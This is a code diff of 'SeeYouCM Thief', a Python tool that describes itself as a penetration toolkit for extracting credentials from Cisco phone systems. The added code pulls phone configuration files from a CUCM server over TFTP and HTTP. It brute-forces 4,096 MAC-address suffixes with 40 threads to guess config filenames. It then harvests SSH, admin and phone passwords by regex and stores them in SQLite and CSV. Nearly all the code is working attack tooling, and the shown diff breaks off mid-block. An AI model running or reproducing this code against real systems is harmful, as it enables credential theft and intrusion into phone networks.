@@ -5,47 +5,79 @@ import re
 import ipaddress
 import socket
 import string
+import os
+import sys
+import tempfile
+import logging
+import csv
+import sqlite3
+import time
+import threading
+import queue
+from datetime import datetime
+from contextlib import redirect_stdout, redirect_stderr
 from bs4 import BeautifulSoup
 from alive_progress import alive_bar
+import tftpy
 
 requests.packages.urllib3.disable_warnings()
+
+# Suppress tftpy logging completely
+logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
+logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
+logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.CRITICAL)
+logging.getLogger('tftpy').setLevel(logging.CRITICAL)
+
+# Constants
+TFTP_PORT = 69
+HTTP_TFTP_PORT = 6970
+HTTPS_UDS_PORT = 8443
+
+# Global variables
+verbose = False
+debug = False
 
 def banner():
     print(
 '''
 ___________
-                   /.---------.\`-._                            
-                  //          ||    `-._                            
-                  || `-._     ||        `-._                        
-                  ||     `-._ ||            `-._                            
-                  ||    _____ ||`-._            \                       
-            _..._ ||   | __ ! ||    `-._        |                           
-          _/     \||   .'  |~~||        `-._    |                           
-      .-``     _.`||  /   _|~~||    .----.  `-._|                       
-     |      _.`  _||  |  |23| ||   / :::: \    \                        
-     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |                        
-      |   _.-`  _.||  |  |79| ||  |   _..-'   /                     
-      _\-`   _.`O ||  |  |_   ||  |::|        |                 
-    .`    _.`O `._||  \    |  ||  |::|        |             
- .-`   _.` `._.'  ||   '.__|--||  |::|        \             
-`-._.-` \`-._     ||   | ":  !||  |  '-.._    |             
-         \   `--._||   |_:"___||  | ::::: |   |
-          \  /\   ||     ":":"||   \ :::: |   |
-           \(  `-.||       .- ||    `.___/    /
+                   /.---------.\`-._
+                  //          ||    `-._
+                  || `-._     ||        `-._
+                  ||     `-._ ||            `-._
+                  ||    _____ ||`-._            \\
+            _..._ ||   | __ ! ||    `-._        |
+          _/     \\||   .'  |~~||        `-._    |
+      .-``     _.`||  /   _|~~||    .----.  `-._|
+     |      _.`  _||  |  |23| ||   / :::: \\    \\
+     \\ _.--`  _.` ||  |  |56| ||  / ::::: |    |
+      |   _.-`  _.||  |  |79| ||  |   _..-'   /
+      _\\-`   _.`O ||  |  |_   ||  |::|        |
+    .`    _.`O `._||  \\    |  ||  |::|        |
+ .-`   _.` `._.'  ||   '.__|--||  |::|        \\
+`-._.-` \\`-._     ||   | ":  !||  |  '-.._    |
+         \\   `--._||   |_:"___||  | ::::: |   |
+          \\  /\\   ||     ":":"||   \\ :::: |   |
+           \\(  `-.||       .- ||    `.___/    /
            |    | ||   _.-    ||              |
            |    / \\.-________\\____.....-----'
-           \    -.      \ |         |
-            \     `.     \ \        | 
- __________  `.    .'\    \|        |\  _________
-    SeeYouCM   `..'   \    |        | \   Thief     
+           \\    -.      \\ |         |
+            \\     `.     \\ \\        |
+             `.    .'\\    \\|        |\\
+               `..'   \\    |        | \\
                 \\   .'    |       /  .`.
-                | \.'      |       |.'   `-._
-                 \     _ . /       \_\-._____)
-                  \_.-`  .`'._____.'`.
-                    \_\-|             |
+                | \\.'      |       |.'   `-._
+                 \\     _ . /       \\_\\-._____)
+                  \\_.-`  .`'._____.'`.
+                    \\_\\-|             |
                          `._________.'
+ __________                                  _________
+    SeeYouCM                                    Thief
 '''
- )
+)
+
+
+
 
 
 
@@ -224,22 +256,331 @@ def get_version(CUCM_host):
         print('CUCM Server {} is not responding'.format(CUCM_host))
     return
 
-def search_for_secrets(CUCM_host,filename):
+def download_config_tftp(CUCM_host, filename):
+    """
+    Download configuration file via TFTP
+    
+    Args:
+        CUCM_host: IP address or hostname of CUCM server
+        filename: Name of the configuration file to download
+    
+    Returns:
+        String content of the file, or None if download fails
+    """
+    try:
+        client = tftpy.TftpClient(CUCM_host, TFTP_PORT)
+        # Create a temporary file to download to
+        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp_file:
+            temp_filename = temp_file.name
+        
+        # Download the file with output suppression unless in debug mode
+        if not globals().get('debug', False):
+            with open(os.devnull, 'w') as devnull:
+                with redirect_stdout(devnull), redirect_stderr(devnull):
+                    client.download(filename, temp_filename, timeout=10)
+        else:
+            client.download(filename, temp_filename, timeout=10)
+        
+        # Read the content
+        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        
+        # Clean up temp file
+        os.unlink(temp_filename)
+        
+        if verbose:
+            print('Successfully downloaded {0} via TFTP'.format(filename))
+        
+        return content
+    except tftpy.TftpException as e:
+        error_msg = str(e)
+        # Only report non-file-not-found errors
+        if 'file not found' not in error_msg.lower() and 'not found' not in error_msg.lower():
+            print(f'[!] TFTP Error for {filename}: {error_msg}')
+        return None
+    except Exception as e:
+        # Report unexpected errors
+        error_msg = str(e)
+        if error_msg and 'file not found' not in error_msg.lower():
+            print(f'[!] Unexpected error downloading {filename} via TFTP: {error_msg}')
+        return None
+
+def download_config_http(CUCM_host, filename):
+    """
+    Download configuration file via HTTP
+    
+    Args:
+        CUCM_host: IP address or hostname of CUCM server
+        filename: Name of the configuration file to download
+    
+    Returns:
+        String content of the file, or None if download fails
+    """
+    url = "http://{0}:{1}/{2}".format(CUCM_host, HTTP_TFTP_PORT, filename)
+    try:
+        __http_response = requests.get(url, timeout=10)
+        if __http_response.status_code == 404:
+            return None
+        else:
+            if verbose:
+                print('Successfully downloaded {0} via HTTP'.format(filename))
+            return __http_response.text
+    except Exception as e:
+        return None
+
+class TFTPBackoffManager:
+    """Manages TFTP request rate with automatic backoff on errors"""
+    def __init__(self):
+        self.error_count = 0
+        self.consecutive_errors = 0
+        self.last_error_time = 0
+        self.delay = 0.0
+        self.lock = threading.Lock()
+    
+    def record_success(self):
+        with self.lock:
+            self.consecutive_errors = 0
+            # Gradually reduce delay on success
+            if self.delay > 0:
+                self.delay = max(0, self.delay - 0.01)
+    
+    def record_error(self):
+        with self.lock:
+            self.error_count += 1
+            self.consecutive_errors += 1
+            self.last_error_time = time.time()
+            
+            # Increase delay based on consecutive errors
+            if self.consecutive_errors > 5:
+                self.delay = min(2.0, self.delay + 0.1)
+            elif self.consecutive_errors > 10:
+                self.delay = min(5.0, self.delay + 0.5)
+    
+    def get_delay(self):
+        with self.lock:
+            return self.delay
+
+def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download):
+    """
+    Worker thread for downloading config files
+    
+    Args:
+        work_queue: Queue of (index, full_mac, filename) tuples to process
+        results_queue: Queue to put results (index, full_mac, content, method)
+        CUCM_host: CUCM server IP
+        use_tftp: Whether to prefer TFTP
+        backoff_manager: TFTPBackoffManager instance for rate limiting
+        no_db: Whether database is disabled
+        db_file: Path to database file
+        force_download: Whether to force re-download
+    """
+    while True:
+        try:
+            task = work_queue.get(timeout=1)
+            if task is None:  # Poison pill to stop worker
+                work_queue.task_done()
+                break
+            
+            index, full_mac, filename = task
+            
+            # Check cache first (unless force flag is set or --no-db)
+            if not force_download and not no_db:
+                was_attempted, was_successful, cached_content = check_already_attempted(CUCM_host, filename, db_file)
+                if was_attempted:
+                    if was_successful and cached_content:
+                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
+                    else:
+                        results_queue.put((index, full_mac, None, 'CACHED', True))
+                    work_queue.task_done()
+                    continue
+            
+            # Apply backoff delay if needed
+            delay = backoff_manager.get_delay()
+            if delay > 0:
+                time.sleep(delay)
+            
+            # Try download
+            method = 'TFTP' if use_tftp else 'HTTP'
+            methods_tried = []
+            content = None
+            
+            try:
+                if use_tftp:
+                    methods_tried.append('TFTP')
+                    content = download_config_tftp(CUCM_host, filename)
+                    if content is None:
+                        methods_tried.append('HTTP')
+                        content = download_config_http(CUCM_host, filename)
+                        method = 'HTTP' if content else 'TFTP+HTTP'
+                else:
+                    methods_tried.append('HTTP')
+                    content = download_config_http(CUCM_host, filename)
+                    if content is None:
+                        methods_tried.append('TFTP')
+                        content = download_config_tftp(CUCM_host, filename)
+                        method = 'TFTP' if content else 'HTTP+TFTP'
+                
+                if content:
+                    backoff_manager.record_success()
+                else:
+                    backoff_manager.record_error()
+                
+            except Exception as e:
+                backoff_manager.record_error()
+                if globals().get('debug', False):
+                    print(f'[!] Worker error downloading {filename}: {str(e)}')
+            
+            # Log the attempt (unless --no-db)
+            if not no_db:
+                log_download_attempt(CUCM_host, filename, content is not None, method, content, db_file)
+            
+            results_queue.put((index, full_mac, content, method, False))
+            work_queue.task_done()
+            
+        except queue.Empty:
+            continue
+        except Exception as e:
+            if globals().get('debug', False):
+                print(f'[!] Worker exception: {str(e)}')
+            work_queue.task_done()
+
+def brute_force_mac_configs(CUCM_host, partial_mac, use_tftp=True, num_threads=40):
+    """
+    Brute force config file downloads by trying different MAC address variations.
+    
+    Args:
+        CUCM_host: IP address or hostname of CUCM server
+        partial_mac: Partial MAC address (9 chars) like 'A4B239B6C'
+        use_tftp: Whether to use TFTP (default: True with HTTP fallback)
+        num_threads: Number of worker threads for parallel downloads (default: 40)
+    
+    Returns:
+        List of tuples: [(full_mac, config_content), ...]
+    """
+    found_configs = []
+    partial_mac = partial_mac.upper().replace(':', '').replace('-', '')
+    
+    # Validate partial MAC length
+    if len(partial_mac) < 9:
+        print(f'Partial MAC too short: {partial_mac} (need at least 9 characters)')
+        return found_configs
+    
+    # If already 12 chars, just try that one
+    if len(partial_mac) >= 12:
+        partial_mac = partial_mac[:12]
+        filename = f'SEP{partial_mac}.cnf.xml'
+        print(f'Trying exact MAC: {partial_mac}')
+        
+        if use_tftp:
+            content = download_config_tftp(CUCM_host, filename)
+            if content is None:
+                content = download_config_http(CUCM_host, filename)
+        else:
+            content = download_config_http(CUCM_host, filename)
+            if content is None:
+                content = download_config_tftp(CUCM_host, filename)
+        
+        if content:
+            found_configs.append((partial_mac, content))
+            print(f'[+] Found config for SEP{partial_mac}')
+        return found_configs
+    
+    # Brute force last 3 characters (1.5 bytes: 000-FFF)
+    partial_mac = partial_mac[:9]
+    
+    successful = 0
+    found_macs = []
+    skipped = 0
+    db_file = globals().get('db_file', 'thief.db')
+    no_db = globals().get('no_db', False)
+    force_download = globals().get('force_download', False)
+    
+    # Setup threading components
+    work_queue = queue.Queue()
+    results_queue = queue.Queue()
+    backoff_manager = TFTPBackoffManager()
+    
+    # Create and start worker threads
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(
+            target=download_worker,
+            args=(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download),
+            daemon=True
+        )
+        t.start()
+        threads.append(t)
+    
+    # Queue all download tasks
+    for i in range(4096):
+        last_three_chars = f'{i:03X}'
+        full_mac = partial_mac + last_three_chars
+        filename = f'SEP{full_mac}.cnf.xml'
+        work_queue.put((i, full_mac, filename))
+    
+    # Process results with progress bar
+    with alive_bar(4096, title=f"> Brute forcing {partial_mac}XXX") as prog_bar:
+        for _ in range(4096):
+            try:
+                index, full_mac, content, method, was_cached = results_queue.get(timeout=60)
+                prog_bar()
+                
+                if was_cached:
+                    skipped += 1
+                
+                if content:
+                    found_configs.append((full_mac, content))
+                    found_macs.append(full_mac)
+                    successful += 1
+                    
+            except queue.Empty:
+                print('[!] Timeout waiting for results')
+                break
+    
+    # Send poison pills to stop workers
+    for _ in range(num_threads):
+        work_queue.put(None)
+    
+    # Wait for all workers to finish
+    for t in threads:
+        t.join(timeout=5)
+    
+    # Print all found configs after progress bar completes
+    if found_macs:
+        print(f'\n[+] Found {len(found_macs)} config(s): {", ".join([f"SEP{mac}" for mac in found_macs])}')
+    
+    if skipped > 0:
+        print(f'[*] Skipped {skipped} previously attempted files (use --force to re-download)')
+    
+    print(f'Brute force complete: {successful}/4096 configs found')
+    return found_configs
+
+def search_for_secrets(CUCM_host, filename, use_tftp=True):
     global found_credentials
     global found_usernames
     lines = str()
     user = str()
     user2 = str()
     password = str()
-    url = "http://{0}:6970/{1}".format(CUCM_host,
-                                        filename)
+    
+    # Download config file using specified method
+    if use_tftp:
+        lines = download_config_tftp(CUCM_host, filename)
+        if lines is None:
+            # Fallback to HTTP if TFTP fails
+            lines = download_config_http(CUCM_host, filename)
+    else:
+        lines = download_config_http(CUCM_host, filename)
+        if lines is None:
+            # Fallback to TFTP if HTTP fails
+            lines = download_config_tftp(CUCM_host, filename)
+    
+    if lines is None:
+        if verbose:
+            print('Unable to download config file: {0}'.format(filename))
+        return
+    
     try:
-        __http_response = requests.get(url, timeout=10)
-        if __http_response.status_code == 404:
-            if verbose:
-                print('Config file not found on HTTP Server: {0}'.format(filename))
-        else:
-            lines = __http_response.text
         for line in lines.split('\n'):
             match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
             if match:
@@ -270,34 +611,637 @@ def search_for_secrets(CUCM_host,filename):
     except Exception as e:
         print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))
 
+def export_to_csv(credentials, usernames, filename='seeyoucm_results.csv'):
+    """
+    Export discovered credentials and usernames to CSV file
+    
+    Args:
+        credentials: List of tuples (username, password, device)
+        usernames: List of tuples (username, device)
+        filename: Output CSV filename
+    """
+    try:
+        with open(filename, 'w', newline='') as csvfile:
+            writer = csv.writer(csvfile)
+            
+            # Write header
+            writer.writerow(['Timestamp', 'Type', 'Device', 'Username', 'Password'])
+            
+            # Write credentials
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            for cred in credentials:
+                username = cred[0] if cred[0] else 'N/A'
+                password = cred[1]
+                device = cred[2]
+                writer.writerow([timestamp, 'Credential', device, username, password])
+            
+            # Write usernames only
+            for user in usernames:
+                # Check if this username doesn't have a corresponding credential
+                device = user[1]
+                username = user[0]
+                has_cred = any(c[2] == device and c[0] == username for c in credentials)
+                if not has_cred:
+                    writer.writerow([timestamp, 'Username', device, username, 'N/A'])
+        
+        print(f'\n[+] Results exported to: {filename}')
+        return True
+    except PermissionError:
+        print(f'\n[-] Error: Permission denied writing to {filename}')
+        return False
+    except IOError as e:
+        print(f'\n[-] I/O error exporting to CSV: {str(e)}')
+        return False
+    except Exception as e:
+        print(f'\n[-] Unexpected error exporting to CSV: {str(e)}')
+        return False
+
+def init_database(db_file='thief.db'):
+    """
+    Initialize SQLite database for tracking download attempts and results
+    """
+    try:
+        # Ensure directory exists
+        import os
+        db_dir = os.path.dirname(db_file)
+        if db_dir and not os.path.exists(db_dir):
+            os.makedirs(db_dir, exist_ok=True)
+        
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+    except sqlite3.Error as e:
+        print(f'[-] Error initializing database: {str(e)}')
+        return None
+    except Exception as e:
+        print(f'[-] Unexpected error initializing database: {str(e)}')
+        return None
+    
+    # Create table for tracking download attempts
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS download_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            filename TEXT NOT NULL,
+            attempt_time TEXT NOT NULL,
+            success INTEGER NOT NULL,
+            method TEXT,
+            content TEXT,
+            UNIQUE(cucm_host, filename)
+        )
+    ''')
+    
+    # Create table for credentials
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS credentials (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            device TEXT NOT NULL,
+            username TEXT,
+            password TEXT,
+            discovery_time TEXT NOT NULL
+        )
+    ''')
+    
+    # Create table for usernames
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS usernames (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            device TEXT NOT NULL,
+            username TEXT NOT NULL,
+            discovery_time TEXT NOT NULL
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+    return db_file
+
+def check_already_attempted(cucm_host, filename, db_file='thief.db'):
+    """
+    Check if we've already attempted to download this file
+    
+    Returns:
+        (bool, bool, str): (was_attempted, was_successful, content)
+    """
+    try:
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            SELECT success, content FROM download_attempts 
+            WHERE cucm_host = ? AND filename = ?
+        ''', (cucm_host, filename))
+        
+        result = cursor.fetchone()
+        conn.close()
+        
+        if result:
+            return (True, bool(result[0]), result[1] if result[1] else None)
+        return (False, False, None)
+    except:
+        return (False, False, None)
+
+def log_download_attempt(cucm_host, filename, success, method, content=None, db_file='thief.db'):
+    """
+    Log a download attempt to the database
+    """
+    try:
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        cursor.execute('''
+            INSERT OR REPLACE INTO download_attempts 
+            (cucm_host, filename, attempt_time, success, method, content)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
+        
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        pass
+
+def log_credentials_to_db(cucm_host, credentials, usernames, db_file='thief.db'):
+    """
+    Log discovered credentials and usernames to database
+    """
+    try:
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # Log credentials
+        for cred in credentials:
+            username = cred[0] if cred[0] else None
+            password = cred[1]
+            device = cred[2]
+            
+            cursor.execute('''
+                INSERT INTO credentials (cucm_host, device, username, password, discovery_time)
+                VALUES (?, ?, ?, ?, ?)
+            ''', (cucm_host, device, username, password, timestamp))
+        
+        # Log usernames
+        for user in usernames:
+            username = user[0]
+            device = user[1]
+            
+            cursor.execute('''
+                INSERT INTO usernames (cucm_host, device, username, discovery_time)
+                VALUES (?, ?, ?, ?)
+            ''', (cucm_host, device, username, timestamp))
+        
+        conn.commit()
+        conn.close()
+        return True
+    except Exception as e:
+        return False
+
+def display_database_summary(db_file='thief.db', cucm_filter=None):
+    """
+    Display credentials discovery summary from database
+    
+    Args:
+        db_file: Path to SQLite database file
+        cucm_filter: Optional CUCM host to filter results (default: show all)
+    """
+    try:
+        if not os.path.exists(db_file):
+            print(f'[-] Database not found: {db_file}')
+            print(f'[-] Run a scan first to populate the database')
+            return
+        
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        # Get credentials
+        if cucm_filter:
+            cursor.execute('''
+                SELECT cucm_host, device, username, password, discovery_time 
+                FROM credentials 
+                WHERE cucm_host = ?
+                ORDER BY discovery_time DESC, device
+            ''', (cucm_filter,))
+        else:
+            cursor.execute('''
+                SELECT cucm_host, device, username, password, discovery_time 
+                FROM credentials 
+                ORDER BY discovery_time DESC, device
+            ''')
+        
+        credentials = cursor.fetchall()
+        
+        # Get usernames
+        if cucm_filter:
+            cursor.execute('''
+                SELECT cucm_host, device, username, discovery_time 
+                FROM usernames 
+                WHERE cucm_host = ?
+                ORDER BY discovery_time DESC, device
+            ''', (cucm_filter,))
+        else:
+            cursor.execute('''
+                SELECT cucm_host, device, username, discovery_time 
+                FROM usernames 
+                ORDER BY discovery_time DESC, device
+            ''')
+        
+        usernames = cursor.fetchall()
+        
+        # Get download stats
+        if cucm_filter:
+            cursor.execute('''
+                SELECT COUNT(*), SUM(success) 
+                FROM download_attempts 
+                WHERE cucm_host = ?
+            ''', (cucm_filter,))
+        else:
+            cursor.execute('''
+                SELECT COUNT(*), SUM(success) 
+                FROM download_attempts
+            ''')
+        
+        stats = cursor.fetchone()
+        total_attempts = stats[0] if stats[0] else 0
+        successful_downloads = stats[1] if stats[1] else 0
+        
+        conn.close()
+        
+        if not credentials and not usernames:
+            print(f'\n[-] No credentials or usernames found in database')
+            if cucm_filter:
+                print(f'[-] Filter: CUCM host = {cucm_filter}')
+            return
+        
+        # Display summary
+        print(f'\n\n{"="*70}')
+        print(f'{"DATABASE CREDENTIALS SUMMARY":^70}')
+        if cucm_filter:
+            print(f'{f"Filter: {cucm_filter}":^70}')
+        print("="*70)
+        
+        if credentials:
+            # Group by device
+            devices_with_creds = {}
+            cucm_hosts = set()
+            for cucm, device, username, password, timestamp in credentials:
+                cucm_hosts.add(cucm)
+                if device not in devices_with_creds:
+                    devices_with_creds[device] = []
+                devices_with_creds[device].append((username, password, timestamp))
+            
+            print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(credentials)} total)\033[0m')
+            if len(cucm_hosts) > 1:
+                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
+            print("-"*70)
+            print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
+            print("-"*70)
+            for device in sorted(devices_with_creds.keys()):
+                for username, password, timestamp in devices_with_creds[device]:
+                    user_display = username if username else 'N/A'
+                    print(f'{device:<20} {user_display:<20} \033[91m{password:<20}\033[0m')
+        
+        if usernames:
+            # Group by device
+            devices_with_users = {}
+            cucm_hosts = set()
+            for cucm, device, username, timestamp in usernames:
+                cucm_hosts.add(cucm)
+                if device not in devices_with_users:
+                    devices_with_users[device] = []
+                devices_with_users[device].append((username, timestamp))
+            
+            print(f'\n\033[1m[+] USERNAMES FOUND ({len(usernames)} total)\033[0m')
+            if len(cucm_hosts) > 1 and not credentials:
+                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
+            print("-"*70)
+            print(f'{"Device":<20} {"Username":<20}')
+            print("-"*70)
+            for device in sorted(devices_with_users.keys()):
+                for username, timestamp in devices_with_users[device]:
+                    print(f'{device:<20} {username:<20}')
+        
+        print(f'\n{"="*70}')
+        print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
+        print(f'  • Total download attempts:      {total_attempts}')
+        print(f'  • Successful downloads:         {successful_downloads}')
+        if credentials:
+            print(f'  • Devices with credentials:     {len(devices_with_creds)}')
+        if usernames:
+            print(f'  • Devices with usernames only:  {len(devices_with_users)}')
+        print(f'  • Total credentials discovered: {len(credentials)}')
+        print(f'  • Total usernames discovered:   {len(usernames)}')
+        print("="*70)
+        
+    except sqlite3.Error as e:
+        print(f'[-] Database error: {str(e)}')
+    except Exception as e:
+        print(f'[-] Error displaying database summary: {str(e)}')
+
+def get_phones_from_gowitness(gowitness_db):
+    """
+    Extract Cisco phone IP addresses from gowitness SQLite database
+    
+    Args:
+        gowitness_db: Path to gowitness SQLite database file
+    
+    Returns:
+        List of IP addresses
+    """
+    try:
+        if not os.path.exists(gowitness_db):
+            print(f'[-] Error: Gowitness database not found: {gowitness_db}')
+            print(f'[-] Please verify the path and try again')
+            return []
+        
+        conn = sqlite3.connect(gowitness_db)
+        cursor = conn.cursor()
+        
+        # Check if results table exists
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='results'")
+        if not cursor.fetchone():
+            print(f'[-] Error: No "results" table found in {gowitness_db}')
+            print(f'[-] This may not be a valid gowitness database')
+            conn.close()
+            return []
+        
+        cursor.execute('''
+            SELECT DISTINCT REPLACE(SUBSTR(url, 8, INSTR(SUBSTR(url, 8), ':') - 1), '/', '') as ip 
+            FROM results 
+            WHERE title LIKE '%Cisco%' 
+            ORDER BY ip
+        ''')
+        
+        results = cursor.fetchall()
+        conn.close()
+        
+        phones = [row[0] for row in results if row[0]]
+        
+        if phones:
+            print(f'[+] Found {len(phones)} Cisco phone(s) in gowitness database')
+        else:
+            print('[-] No Cisco phones found in gowitness database')
+            print('[-] Make sure the database contains Cisco phone entries')
+        
+        return phones
+    except sqlite3.Error as e:
+        print(f'[-] SQLite error reading gowitness database: {str(e)}')
+        return []
+    except Exception as e:
+        print(f'[-] Unexpected error reading gowitness database: {str(e)}')
+        return []
+
 if __name__ == '__main__':
+    # Show banner before parsing arguments so it displays with --help
     banner()
+    
     global found_usernames
     global found_credentials
 
-    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
-    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
-    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS api')
-    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Filename to output enumerated users to.')
-    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
-    parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
-    parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
-    parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')
+    parser = argparse.ArgumentParser(description='Penetration toolkit for extracting credentials from Cisco phone systems')
+    
+    # Target Specification
+    parser.add_argument('-H','--host', default=None, type=str, help='Specify CUCM (Cisco Unified Communications Manager) IP address')
+    parser.add_argument('-p','--phone', type=str, action='append', help='Specify Cisco phone IP address (repeatable for multiple targets)')
+    parser.add_argument('--gowitness', type=str, metavar='DB_FILE', help='Load phone targets from gowitness SQLite database')
+    parser.add_argument('-e','--enumsubnet', type=str, help='Enumerate and attack entire subnet in CIDR notation (e.g., 192.168.1.0/24)')
+    
+    # Attack Options
+    parser.add_argument('-b','--brute-mac', action='store_true', default=False, help='Brute force all MAC address variations (00-FF) for detected phone prefixes')
+    parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
+    parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
+    
+    # Output Options
+    parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
+    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Specify output file for enumerated usernames (default: cucm_users.txt)')
+    
+    # Database Options
+    parser.add_argument('--db', type=str, metavar='FILENAME', default='thief.db', help='Specify SQLite database for caching results (default: thief.db)')
+    parser.add_argument('--no-db', action='store_true', default=False, help='Disable database caching and operate without persistent storage')
+    parser.add_argument('--show-db', action='store_true', default=False, help='Display summary of credentials stored in database and exit')
+    
+    # Debugging
+    parser.add_argument('-d','--debug', action='store_true', default=False, help='Enable verbose output including all failed attempts and TFTP operations')
 
     args = parser.parse_args()
 
+    # Handle --show-db early (display database summary and exit)
+    if args.show_db:
+        db_file = args.db
+        cucm_filter = args.host
+        display_database_summary(db_file, cucm_filter)
+        quit(0)
+
     CUCM_host = args.host
-    phone = args.phone
-    subnet = args.subnet
-    verbose = args.verbose
+    phones = args.phone if args.phone else []
+    gowitness_db = args.gowitness
+    
+    # Load phones from gowitness database if specified
+    if gowitness_db:
+        gowitness_phones = get_phones_from_gowitness(gowitness_db)
+        if gowitness_phones:
+            phones.extend(gowitness_phones)
+        else:
+            print('[-] Failed to load phones from gowitness database')
+            if not phones:
+                print('[-] No phones available. Exiting.')
+                quit(1)
+    
+    use_tftp = True  # TFTP is default, with automatic HTTP fallback
+    debug = args.debug
+    verbose = debug  # Verbose is an alias for debug mode
     enumsubnet = args.enumsubnet
+    brute_mac = args.brute_mac
+    csv_output = args.csv
+    db_file = args.db
+    no_db = args.no_db
+    force_download = args.force
     found_credentials = []
     found_usernames = []
     file_names = ''
     hostnames = []
     outfile = args.outfile
+    
+    # Initialize database unless --no-db is set
+    if not no_db:
+        init_database(db_file)
+    
+    # Enable tftpy logging only in debug mode
+    if debug:
+        logging.getLogger('tftpy.TftpClient').setLevel(logging.DEBUG)
+        logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
+        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.DEBUG)
+        logging.getLogger('tftpy').setLevel(logging.DEBUG)
 
     get_version(CUCM_host)
+
+    # Handle MAC brute forcing from detected phones
+    if brute_mac:
+        if not phones:
+            print('You must specify at least one phone with -p when using --brute-mac')
+            quit(1)
+        
+        print(f'MAC brute force mode enabled for {len(phones)} phone(s)\n')
+        
+        # Map each MAC prefix to its CUCM server
+        mac_to_cucm = {}
+        all_found_macs = set()
+        
+        # Detect MACs and CUCM from each phone
+        for phone in phones:
+            print(f'Detecting MAC address from phone {phone}...')
+            
+            try:
+                # Try to get hostname/MAC from phone
+                hostname = get_hostname_from_phone(phone)
+                if hostname:
+                    # Extract MAC from hostname (SEP + 12 hex chars)
+                    mac_match = re.search(r'SEP([0-9A-F]{12})', hostname, re.IGNORECASE)
+                    if mac_match:
+                        full_mac = mac_match.group(1).upper()
+                        partial_mac = full_mac[:9]
+                        print(f'  Detected: SEP{full_mac}')
+                        
+                        # Detect CUCM for this specific phone
+                        if CUCM_host:
+                            phone_cucm = CUCM_host
+                        else:
+                            phone_cucm = get_cucm_name_from_phone(phone)
+                            if not phone_cucm:
+                                print(f'  [-] Could not detect CUCM host from phone {phone}')
+                                continue
+                        
+                        print(f'  CUCM Server: {phone_cucm}')
+                        print(f'  Using partial MAC: {partial_mac} for brute force\n')
+                        
+                        all_found_macs.add(partial_mac)
+                        mac_to_cucm[partial_mac] = phone_cucm
+                    else:
+                        print(f'  [-] Could not extract MAC from hostname: {hostname}')
+                else:
+                    print(f'  [-] Could not detect hostname from phone {phone}')
+                    print(f'  [-] Phone may be unreachable or not a Cisco device')
+            except Exception as e:
+                print(f'  [-] Error detecting MAC from {phone}: {str(e)}')
+        
+        if not all_found_macs:
+            print('No MAC addresses detected. Cannot proceed with brute force.')
+            quit(1)
+        
+        # Brute force each unique MAC prefix with its corresponding CUCM
+        all_configs = []
+        for partial_mac in all_found_macs:
+            phone_cucm = mac_to_cucm[partial_mac]
+            if debug:
+                print(f'[*] Brute forcing MAC prefix: {partial_mac} on CUCM {phone_cucm}')
+            configs = brute_force_mac_configs(phone_cucm, partial_mac, use_tftp)
+            all_configs.extend(configs)
+        
+        # Process all found configs
+        if all_configs:
+            print(f'\n\n{"="*60}')
+            print(f'SUMMARY: {len(all_configs)} configuration files found!')
+            print("="*60)
+            
+            # Get CUCM host for logging (use first one from mapping)
